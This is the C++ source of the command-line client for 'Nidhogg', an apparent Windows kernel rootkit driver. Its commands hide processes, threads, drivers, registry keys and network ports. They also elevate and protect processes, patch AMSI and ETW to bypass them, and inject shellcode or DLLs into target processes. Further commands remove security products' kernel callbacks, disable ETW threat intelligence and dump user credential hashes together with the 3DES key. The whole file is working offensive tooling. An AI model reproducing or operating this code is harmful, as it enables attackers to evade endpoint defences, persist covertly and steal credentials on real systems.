#include "pch.h"
#include <sstream>
#include <fstream>

#include "Nidhogg.h"

enum class Options {
	Unknown,
	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Patch, InjectShellcode, InjectDll, DumpCredentials,
	ExecuteScript
};

#define PRINT_ASCII_ART

#ifdef PRINT_ASCII_ART
constexpr const char* ASCII_ART = R"(                  
                                 8                           
                               38                            
                              988                            
                        90  79888  3                         
                       880 8998880 88                        
                       88899998888088                        
                      7809999999888086                       
                     50899999999888888     0                 
                8     09999999999888888     8                
               83      999999999998880      08               
              08      0899  99999 8880      880              
              88     02  9999999990  3488   488              
              888  88331   0999992  286     880              
             4888     84    99999  90     28887              
              8880      0   22032  8       880               
               888      5   22232  3     8888                
               88888         233        08808                
                  9888        2       8880 9                 
                 988388888        088888888                  
                  88      0883 8881     48                   
                            5888                             
                              8                                                    
)";
#else
constexpr const char* ASCII_ART = "";
#endif

void PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | unhide | query ] [tid]" << std::endl;
	std::cout << "\tNidhoggClient.exe module [hide] [pid] [module path]" << std::endl;
	std::cout << "\tNidhoggClient.exe driver [hide | unhide] [driver path]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma separated]" << std::endl;
	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
	std::cout << "\tNidhoggClient.exe dump_creds" << std::endl;
	std::cout << "\tNidhoggClient.exe port [hide | unhide | query | clear] [port number] [tcp/udp] [remote/local]" << std::endl;
	std::cout << "\tNidhoggClient.exe exec_script [script_file]" << std::endl;
}

std::vector<byte> ConvertToVector(std::wstring rawPatch) {
	int b;
	std::vector<byte> vec;
	std::wstringstream rawPatchStream(rawPatch);
	std::wstringstream byteToAdd;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		byteToAdd << std::hex << i;

		if (rawPatchStream.peek() == L',') {
			rawPatchStream.ignore();
			byteToAdd >> b;
			vec.push_back(b);
			byteToAdd.clear();
		}
	}
	byteToAdd >> b;
	vec.push_back(b);

	return vec;
}

int ConvertToInt(std::wstring rawString) {
	std::wstringstream rawPatchStream(rawString);
	std::wstringstream convertedString;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		convertedString << std::hex << i;
	}

	return _wtoi(convertedString.str().c_str());
}


int wmain(int argc, const wchar_t* argv[]) {
	std::vector<DWORD> pids;
	Options option;
	NidhoggErrorCodes success = NIDHOGG_INVALID_INPUT;
	std::cout << ASCII_ART << std::endl;

	NidhoggInterface nidhoggInterface = NidhoggInterface();

	if (!nidhoggInterface.IsValid())
		return NIDHOGG_ERROR_CONNECT_DRIVER;

	if (argc < 2) {
		PrintUsage();
		nidhoggInterface.PrintError(NIDHOGG_INVALID_INPUT);
		nidhoggInterface.~NidhoggInterface();
		return NIDHOGG_INVALID_INPUT;
	}

	if (_wcsicmp(argv[1], L"dump_creds") == 0)
		option = Options::DumpCredentials;
	else if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
		option = Options::Add;
	else if (_wcsicmp(argv[2], L"remove") == 0 || _wcsicmp(argv[2], L"disable") == 0)
		option = Options::Remove;
	else if (_wcsicmp(argv[2], L"clear") == 0)
		option = Options::Clear;
	else if (_wcsicmp(argv[2], L"hide") == 0)
		option = Options::Hide;
	else if (_wcsicmp(argv[2], L"unhide") == 0)
		option = Options::Unhide;
	else if (_wcsicmp(argv[2], L"elevate") == 0)
		option = Options::Elevate;
	else if (_wcsicmp(argv[2], L"signature") == 0)
		option = Options::Signature;
	else if (_wcsicmp(argv[2], L"query") == 0)
		option = Options::Query;
	else if (_wcsicmp(argv[1], L"patch") == 0)
		option = Options::Patch;
	else if (_wcsicmp(argv[1], L"shinject") == 0)
		option = Options::InjectShellcode;
	else if (_wcsicmp(argv[1], L"dllinject") == 0)
		option = Options::InjectDll;
	else if (_wcsicmp(argv[1], L"exec_script") == 0)
		option = Options::ExecuteScript;
	else {
		std::cerr << "[ - ] Unknown option." << std::endl;
		nidhoggInterface.PrintError(NIDHOGG_INVALID_INPUT);
		nidhoggInterface.~NidhoggInterface();
		return NIDHOGG_INVALID_INPUT;
	}

	std::cout << "[ + ] Connected to driver" << std::endl;

	if (argv[2])
		std::wcout << L"[ + ] Attempting to " << argv[2] << L" a " << argv[1] << std::endl;
	else
		std::wcout << L"[ + ] Attempting to " << argv[1] << std::endl;

	switch (option) {
	case Options::Add:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = nidhoggInterface.ProcessProtect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			success = nidhoggInterface.ThreadProtect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = nidhoggInterface.FileProtect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = nidhoggInterface.RegistryProtectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = nidhoggInterface.RegistryProtectKey(_wcsdup(argv[3]));
			}
		}
		else if (_wcsicmp(argv[1], L"etwti") == 0)
			success = nidhoggInterface.EnableDisableEtwTi(true);
		else if (_wcsicmp(argv[1], L"callbacks") == 0) {
			CallbackType callbackType;
			ULONG64 address = 0;

			if (_wcsicmp(argv[3], L"ObProcessType") == 0)
				callbackType = ObProcessType;
			else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
				callbackType = ObThreadType;
			else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
				callbackType = PsCreateProcessType;
			else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
				callbackType = PsCreateProcessTypeEx;
			else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
				callbackType = PsCreateThreadType;
			else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
				callbackType = PsCreateThreadTypeNonSystemThread;
			else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
				callbackType = PsImageLoadType;
			else {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}
			std::wistringstream iss(argv[4]);
			iss >> address;
			success = nidhoggInterface.RestoreCallback(address, callbackType);
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Remove:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = nidhoggInterface.ProcessUnprotect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			success = nidhoggInterface.ThreadUnprotect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = nidhoggInterface.FileUnprotect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = nidhoggInterface.RegistryUnprotectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = nidhoggInterface.RegistryUnprotectKey(_wcsdup(argv[3]));
			}
		}
		else if (_wcsicmp(argv[1], L"etwti") == 0)
			success = nidhoggInterface.EnableDisableEtwTi(false);
		else if (_wcsicmp(argv[1], L"callbacks") == 0) {
			CallbackType callbackType;
			ULONG64 address = 0;

			if (_wcsicmp(argv[3], L"ObProcessType") == 0)
				callbackType = ObProcessType;
			else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
				callbackType = ObThreadType;
			else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
				callbackType = PsCreateProcessType;
			else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
				callbackType = PsCreateProcessTypeEx;
			else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
				callbackType = PsCreateThreadType;
			else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
				callbackType = PsCreateThreadTypeNonSystemThread;
			else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
				callbackType = PsImageLoadType;
			else {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}
			std::wistringstream iss(argv[4]);
			iss >> address;
			success = nidhoggInterface.DisableCallback(address, callbackType);
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Clear:
	{
		if (_wcsicmp(argv[1], L"process") == 0)
			success = nidhoggInterface.ProcessClearAllProtection();
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			success = nidhoggInterface.ThreadClearAllProtection();
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = nidhoggInterface.FileClearAllProtection();
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			success = nidhoggInterface.RegistryClearAll();
		}
		else if (_wcsicmp(argv[1], L"port") == 0) {
			success = nidhoggInterface.ClearHiddenPorts();
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Hide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = nidhoggInterface.ProcessHide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			success = nidhoggInterface.ThreadHide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"module") == 0) {
			if (argc == 5)
				success = nidhoggInterface.HideModule(_wtoi(argv[3]), (wchar_t*)argv[4]);
		}
		else if (_wcsicmp(argv[1], L"driver") == 0) {
			if (argc == 4)
				success = nidhoggInterface.HideDriver((wchar_t*)argv[3]);
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = nidhoggInterface.RegistryHideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = nidhoggInterface.RegistryHideKey(_wcsdup(argv[3]));
			}
		}
		else if (_wcsicmp(argv[1], L"port") == 0) {
			PortType portType;
			USHORT port = 0;
			bool remote = true;

			if (argc != 6) {
				success = NIDHOGG_INVALID_INPUT;
				break;
			}

			if (_wcsicmp(argv[4], L"tcp") == 0) {
				portType = PortType::TCP;

				if (_wcsicmp(argv[5], L"remote") == 0)
					remote = true;
				else if (_wcsicmp(argv[5], L"local") == 0)
					remote = false;
				else {
					success = NIDHOGG_INVALID_INPUT;
					break;
				}
			}
			else if (_wcsicmp(argv[4], L"udp") == 0)
				portType = PortType::UDP;
			else {
				success = NIDHOGG_INVALID_INPUT;
				break;
			}

			port = (USHORT)_wtoi(argv[3]);

			success = nidhoggInterface.HidePort(port, portType, remote);
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Unhide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = nidhoggInterface.ProcessUnhide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			success = nidhoggInterface.ThreadUnhide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NIDHOGG_INVALID_OPTION;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = nidhoggInterface.RegistryUnhideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = nidhoggInterface.RegistryUnhideKey(_wcsdup(argv[3]));
			}
		}
		else if (_wcsicmp(argv[1], L"driver") == 0) {
			if (argc == 4)
				success = nidhoggInterface.UnhideDriver(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"port") == 0) {
			PortType portType;
			USHORT port = 0;
			bool remote = true;

			if (argc != 6) {
				success = NIDHOGG_INVALID_INPUT;
				break;
			}

			if (_wcsicmp(argv[4], L"tcp") == 0) {
				portType = PortType::TCP;

				if (_wcsicmp(argv[5], L"remote") == 0)
					remote = true;
				else if (_wcsicmp(argv[5], L"local") == 0)
					remote = false;
				else {
					success = NIDHOGG_INVALID_INPUT;
					break;
				}
			}
			else if (_wcsicmp(argv[4], L"udp") == 0)
				portType = PortType::UDP;
			else {
				success = NIDHOGG_INVALID_INPUT;
				break;
			}

			port = (USHORT)_wtoi(argv[3]);

			success = nidhoggInterface.UnhidePort(port, portType, remote);
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Elevate:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = nidhoggInterface.ProcessElevate(_wtoi(argv[3]));
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Signature:
	{
		if (_wcsicmp(argv[1], L"process") == 0 && argc == 6) {
			int signatureType = _wtoi(argv[4]);
			int signatureSigner = _wtoi(argv[5]);

			if ((signatureType < PsProtectedTypeNone || signatureType > PsProtectedTypeProtected) ||
				(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			success = nidhoggInterface.ProcessSetProtection(_wtoi(argv[3]), signatureType, signatureSigner);
		}
		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Query:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			std::vector<DWORD> result = nidhoggInterface.QueryProcesses();

			if (result[0] < 4) {
				success = (NidhoggErrorCodes)result[0];
				break;
			}

			std::cout << "[ + ] Protected pids:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}

			success = NIDHOGG_SUCCESS;
			break;
		}
		else if (_wcsicmp(argv[1], L"thread") == 0) {
			std::vector<DWORD> result = nidhoggInterface.QueryThreads();

			if (result[0] < 4) {
				success = (NidhoggErrorCodes)result[0];
				break;
			}

			std::cout << "[ + ] Protected tids:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}

			success = NIDHOGG_SUCCESS;
			break;
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::vector<std::wstring> result = nidhoggInterface.QueryFiles();

			if (std::isdigit(result[0][0])) {
				success = (NidhoggErrorCodes)std::stoi(result[0]);
				break;
			}

			std::cout << "[ + ] Protected files:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::wcout << "\t" << result[i] << std::endl;
			}

			success = NIDHOGG_SUCCESS;
			break;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc != 4) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[3], L"value") == 0) {
				RegistryQueryResult result = nidhoggInterface.RegistryQueryProtectedValues();

				if (std::isdigit(result.Values[0][0])) {
					success = (NidhoggErrorCodes)std::stoi(result.Values[0]);
					break;
				}

				std::cout << "[ + ] Protected registry values:" << std::endl;

				for (int i = 0; i < result.Values.size(); i++) {
					std::wcout << "\tKeyName: " << result.Keys[i] << std::endl;
					std::wcout << "\tValueName: " << result.Values[i] << std::endl;
				}

				result = nidhoggInterface.RegistryQueryHiddenValues();

				if (std::isdigit(result.Values[0][0])) {
					success = (NidhoggErrorCodes)std::stoi(result.Values[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry values:" << std::endl;

				for (int i = 0; i < result.Values.size(); i++) {
					std::wcout << "\tKeyName: " << result.Keys[i] << std::endl;
					std::wcout << "\tValueName: " << result.Values[i] << std::endl;
				}

				success = NIDHOGG_SUCCESS;
				break;
			}
			else if (_wcsicmp(argv[3], L"key") == 0) {
				std::vector<std::wstring> result = nidhoggInterface.RegistryQueryProtectedKeys();

				if (std::isdigit(result[0][0])) {
					success = (NidhoggErrorCodes)std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Protected registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}

				result = nidhoggInterface.RegistryQueryHiddenKeys();

				if (std::isdigit(result[0][0])) {
					success = (NidhoggErrorCodes)std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}

				success = NIDHOGG_SUCCESS;
				break;
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
		}

		else if (_wcsicmp(argv[1], L"callbacks") == 0) {
			if (argc != 4) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}
			CallbackType callbackType;

			if (_wcsicmp(argv[3], L"ObProcessType") == 0)
				callbackType = ObProcessType;
			else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
				callbackType = ObThreadType;
			else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
				callbackType = PsCreateProcessType;
			else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
				callbackType = PsCreateProcessTypeEx;
			else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
				callbackType = PsCreateThreadType;
			else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
				callbackType = PsCreateThreadTypeNonSystemThread;
			else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
				callbackType = PsImageLoadType;
			else if (_wcsicmp(argv[3], L"CmRegistryType") == 0)
				callbackType = CmRegistryType;
			else {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (callbackType == ObProcessType || callbackType == ObThreadType) {
				ObCallbacksList callbacks{};
				ObCallback currentCallback;

				callbacks = nidhoggInterface.ListObCallbacks(callbackType, &success);

				if (success == NIDHOGG_SUCCESS) {
					for (ULONG i = 0; i < callbacks.NumberOfCallbacks; i++) {
						currentCallback = callbacks.Callbacks[i];

						if (currentCallback.DriverName)
							std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
						else
							std::cout << "Driver Name: Unknown" << std::endl;
						std::cout << "\tPre operation callback: " << std::hex << currentCallback.PreOperation << std::endl;
						std::cout << "\tPost operation callback: " << std::hex << currentCallback.PostOperation << std::endl;
					}

					free(callbacks.Callbacks);
				}
			}
			else if (callbackType == CmRegistryType) {
				CmCallbacksList callbacks{};
				CmCallback currentCallback;

				callbacks = nidhoggInterface.ListRegistryCallbacks(&success);

				if (success == NIDHOGG_SUCCESS) {
					for (ULONG i = 0; i < callbacks.NumberOfCallbacks; i++) {
						currentCallback = callbacks.Callbacks[i];

						if (currentCallback.DriverName)
							std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
						else
							std::cout << "Driver Name: Unknown" << std::endl;
						std::cout << "\tCallback: " << std::hex << currentCallback.CallbackAddress << std::endl;
						std::cout << "\tContext: " << std::hex << currentCallback.Context << std::endl;
					}

					free(callbacks.Callbacks);
				}
			}
			else {
				PsRoutinesList routines{};
				PsRoutine currentRoutine;
				routines = nidhoggInterface.ListPsRoutines(callbackType, &success);

				if (success == NIDHOGG_SUCCESS) {
					for (ULONG i = 0; i < routines.NumberOfRoutines; i++) {
						currentRoutine = routines.Routines[i];

						if (currentRoutine.DriverName)
							std::cout << "Driver Name: " << currentRoutine.DriverName << std::endl;
						else
							std::cout << "Driver Name: Unknown" << std::endl;
						std::cout << "\tCallback: " << std::hex << currentRoutine.CallbackAddress << std::endl;
					}
				}
			}
		}

		else if (_wcsicmp(argv[1], L"port") == 0) {
			std::wstring remote = L"";
			std::wstring strType = L"";
			std::vector<HiddenPort> result = nidhoggInterface.QueryHiddenPorts();

			if (result.empty()) {
				success = nidhoggInterface.GetNidhoggLastError();
				break;
			}

			std::cout << "[ + ] Hidden ports:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				remote = result[i].Remote ? L"(Remote)" : L"(Local)";
				strType = result[i].Type == PortType::TCP ? L"TCP" : L"UDP";
				std::wcout << "\tPort number: " << result[i].Port << L" " << remote << std::endl;
				std::wcout << "\tType: " << strType << std::endl;
			}

			success = NIDHOGG_SUCCESS;
			break;
		}

		else {
			success = NIDHOGG_INVALID_OPTION;
		}
		break;
	}

	case Options::Patch:
	{
		if (argc != 6 && argc != 4) {
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		int pid = _wtoi(argv[2]);

		if (pid == 0) {
			std::cerr << "[ - ] Invalid PID." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		if (_wcsicmp(argv[3], L"amsi") == 0) {
			success = nidhoggInterface.AmsiBypass(pid);
		}
		else if (_wcsicmp(argv[3], L"etw") == 0) {
			success = nidhoggInterface.ETWBypass(pid);
		}
		else {
			std::wstring wFunctionName(argv[4]);
			std::string functionName(wFunctionName.begin(), wFunctionName.end());
			std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));

			success = nidhoggInterface.PatchModule(pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
		}
		break;
	}

	case Options::InjectShellcode:
	{
		InjectionType injectionType;
		PVOID parameter1 = NULL;
		PVOID parameter2 = NULL;
		PVOID parameter3 = NULL;

		int pid = _wtoi(argv[3]);

		if (pid == 0) {
			std::cerr << "[ - ] Invalid PID." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		if (_wcsicmp(argv[2], L"thread") == 0)
			injectionType = NtCreateThreadExInjection;

		else if (_wcsicmp(argv[2], L"apc") == 0) {
			injectionType = APCInjection;

			if (argc >= 5) {
				parameter1 = (PVOID)argv[5];

				if (argc >= 6) {
					parameter2 = (PVOID)argv[6];

					if (argc == 7) {
						parameter3 = (PVOID)argv[7];
					}
				}
			}
		}
		else {
			std::cerr << "[ - ] Invalid injection type." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		std::ifstream input(argv[4], std::ios::binary);

		if (input.bad()) {
			std::cerr << "[ - ] Invalid shellcode file." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}
		std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});

		success = nidhoggInterface.InjectShellcode(pid, shellcode.data(), (ULONG)shellcode.size(), parameter1, parameter2, parameter3, injectionType);
		break;
	}

	case Options::InjectDll:
	{
		InjectionType injectionType;

		if (_wcsicmp(argv[2], L"thread") == 0)
			injectionType = NtCreateThreadExInjection;
		else if (_wcsicmp(argv[2], L"apc") == 0)
			injectionType = APCInjection;
		else {
			std::cerr << "[ - ] Invalid injection type." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		int pid = _wtoi(argv[3]);

		if (pid == 0) {
			std::cerr << "[ - ] Invalid PID." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}

		std::wstring temp = std::wstring(argv[4]);
		std::string dllPath = std::string(temp.begin(), temp.end());

		success = nidhoggInterface.InjectDll(pid, dllPath.c_str(), injectionType);
		break;
	}

	case Options::DumpCredentials:
	{
		DesKeyInformation desKey{};
		std::wstring currentUsername;
		std::wstring currentDomain;
		std::vector<Credentials> creds = nidhoggInterface.DumpCredentials(&desKey, &success);

		if (success == NIDHOGG_SUCCESS) {
			std::cout << "3DES Key (size: 0x" << std::hex << desKey.Size << "): ";
			for (DWORD i = 0; i < desKey.Size; i++)
				std::cout << (int)(((PUCHAR)desKey.Data)[i]);
			std::cout << "\nCredentials:" << std::endl;

			for (DWORD i = 0; i < creds.size(); i++) {
				currentUsername = std::wstring(creds[i].Username.Buffer, creds[i].Username.Length / sizeof(WCHAR));
				currentDomain = std::wstring(creds[i].Domain.Buffer, creds[i].Domain.Length / sizeof(WCHAR));
				std::wcout << L"\nUsername: " << currentUsername << std::endl;
				std::wcout << L"Domain: " << currentDomain << std::endl;
				std::cout << "Encrypted Hash: ";

				for (DWORD j = 0; j < creds[i].EncryptedHash.Length; j++)
					std::cout << (int)(((PUCHAR)creds[i].EncryptedHash.Buffer)[j]);
				std::cout << std::endl;

				free(creds[i].Username.Buffer);
				free(creds[i].Domain.Buffer);
				free(creds[i].EncryptedHash.Buffer);
			}
			std::cout << std::endl;
		}
		break;
	}

	case Options::ExecuteScript:
	{
		if (argc != 3) {
			success = NIDHOGG_INVALID_OPTION;
			break;
		}
		std::ifstream input(argv[2], std::ios::binary);

		if (input.bad()) {
			std::cerr << "[ - ] Invalid script file." << std::endl;
			success = NIDHOGG_INVALID_OPTION;
			break;
		}
		std::vector<unsigned char> script(std::istreambuf_iterator<char>(input), {});

		success = nidhoggInterface.ExecuteScript(script.data(), (DWORD)script.size());
		break;
	}
	}

	if (success == NIDHOGG_SUCCESS)
		std::cout << "[ + ] Operation succeeded." << std::endl;
	else
		nidhoggInterface.PrintError(success);

	nidhoggInterface.~NidhoggInterface();

	return success;
}
